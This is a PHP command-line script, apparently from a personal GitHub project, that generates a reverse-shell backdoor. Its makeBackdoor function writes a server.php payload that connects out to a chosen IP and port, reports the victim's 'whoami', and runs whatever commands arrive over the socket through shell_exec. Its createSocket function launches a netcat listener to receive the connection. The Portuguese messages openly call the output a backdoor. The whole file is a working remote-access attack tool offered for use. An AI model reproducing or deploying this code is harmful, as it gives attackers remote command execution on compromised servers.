<?php
/**
 * Client code by Alan Barcellos
 * github: https://github.com/barcellosDev
 */

error_reporting(0);
class Client
{
  private static $rotas = [
    'ip' => [
      '--host' => '-h'
    ],
    'port' => [
      '--port' => '-p'
    ],
    'dir' => [
      '--diretorio' => '-d'
    ]
  ];
  private static $output;

  private static function ajuda()
  {
    echo "* -p or --port para definir a porta de escuta\n";
    echo "* -h or --host para definir o seu IP\n";
    exit();
  }

  public static function listen()
  {
    global $argv;

    if (count($argv) == 1)
    {
      if (file_exists('server.php'))
      {
        echo "Se quiser criar uma nova backdoor abra o script novamente com os argumentos necessários \n\n";
        echo "Digite 'y' para iniciar a escuta: ";

        $init = trim(fgets(STDIN));
        if ($init == 'y')
        {
          self::createSocket(self::$output['porta'], self::$output['dir']);
        } else
        {
          echo "Comando inválido! \n";
        }
      } else
      {
        self::ajuda();
      }
    } else
    {
      self::$output = self::verificaArgumentos();

      if (!file_exists('server.php'))
      {
        self::makeBackdoor();
        echo "Backdoor criado com sucesso!\n\n";
        echo "Digite -n ou --now para iniciar a escuta agora. Se nada informado sairá do script: ";

        $now = trim(fgets(STDIN));

        if ($now == '-n' or $now == '--now')
        {
          self::createSocket(self::$output['porta'], self::$output['dir']);
        } else
        {
          echo "Seu arquivo foi salvo como server.php! \n";
          echo "Para iniciar a escuta, abra este arquivo novamente \n";
        }
      } else
      {
        self::makeBackdoor();
        echo "Backdoor sobescrita e salva com sucesso! \n";
        echo "Digite -n ou --now para iniciar a escuta agora. Se nada informado sairá do script: ";

        $now = trim(fgets(STDIN));

        if ($now == '-n' or $now == '--now')
        {
          self::createSocket(self::$output['porta'], self::$output['dir']);
        } else
        {
          echo "Seu arquivo foi salvo como server.php! \n";
          echo "Para iniciar a escuta, abra este arquivo novamente \n";
        }
      }
    }
  }

  private static function createSocket($porta, $diretorio)
  {
    if (isset($diretorio))
    {
      $cmd = 'start "PHP Shell" cmd /c "'.$diretorio.' -l -p '.$porta.' -vv & pause"';
      shell_exec($cmd);
    } else
    {
      $cmd = 'start "PHP Shell" cmd /c "nc -l -p '.$porta.' -vv & pause"';
      shell_exec($cmd);
    }
  }

  private static function makeBackdoor()
  {
    $ip = self::$output['ip'];
    $porta = self::$output['porta'];

    $conteudo = '<?php
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!socket_connect($socket, '."'$ip'".', '. "$porta".'))
    {
      echo socket_strerror(socket_last_error());
    } else
    {
      $bool = true;
      while ($bool)
      {
        socket_write($socket, "PHP Shell "'. '.shell_exec("whoami")'.'. " > ");
        $cmd = trim(socket_read($socket, 4096));
        socket_write($socket, shell_exec($cmd));

        $exit = ["Sair", "sair", "Quit", "quit", "leave", "Leave", "Exit", "exit"];
        foreach ($exit as $key => $value)
        {
          if ($cmd == $value)
          {
            $bool = false;
          }
        }
      }
      if (!$bool)
        socket_close($socket);
    }
    ?>
    ';

    $f = fopen('server.php', 'wb');
    fwrite($f, $conteudo);
    fclose($f);
  }

  private static function validaIP($ip)
  {
    $ex = explode('.', (string)$ip);

    foreach ($ex as $key => $value)
    {
      $vazio = ($ex[$key] === '' or !is_numeric($ex[$key])) ? false : true ;

      if (!$vazio)
      {
        return false;
        exit();
      }
    }
    return true;
  }

  private static function verificaArgumentos()
  {
    global $argv;
    foreach ($argv as $chave => $valor)
    {
      foreach (self::$rotas['ip'] as $opcao => $alter)
      {
        if ($valor == $opcao or $valor == $alter)
        {
          $ip = (isset($argv[$chave+1]) and substr_count($argv[$chave+1], '.') == 3 and self::validaIP($argv[$chave+1]) == true) ? $argv[$chave+1] : null;
        }
      }
      foreach (self::$rotas['port'] as $key => $value)
      {
        if ($valor == $key or $valor == $value)
        {
          $port = (isset($argv[$chave+1]) and is_numeric($argv[$chave+1]) and strlen($argv[$chave+1]) < 5 and $argv[$chave+1] != 0) ? $argv[$chave+1] : null;
        }
      }
      foreach (self::$rotas['dir'] as $caminho => $alter_caminho)
      {
        if ($valor == $caminho or $valor == $alter_caminho)
        {
          $directory = (isset($argv[$chave+1]) and substr_count($argv[$chave+1], '/') != 0 or substr_count($argv[$chave+1], "\\") != 0) ? $argv[$chave+1] : null ;
        }
      }
    }
    if (is_null($ip))
    {
      echo "Defina um IP válido! \n";
      exit();
    } else
    {
      if (is_null($port))
      {
        echo "Defina uma porta válida! \n";
        exit();
      } else
      {
        if (is_null($directory))
        {
          return [
            'ip' => $ip,
            'porta' => $port
          ];
        } else
        {
          return [
            'ip' => $ip,
            'porta' => $port,
            'dir' => $directory
          ];
        }
      }
    }
  }
}
Client::listen();
?>
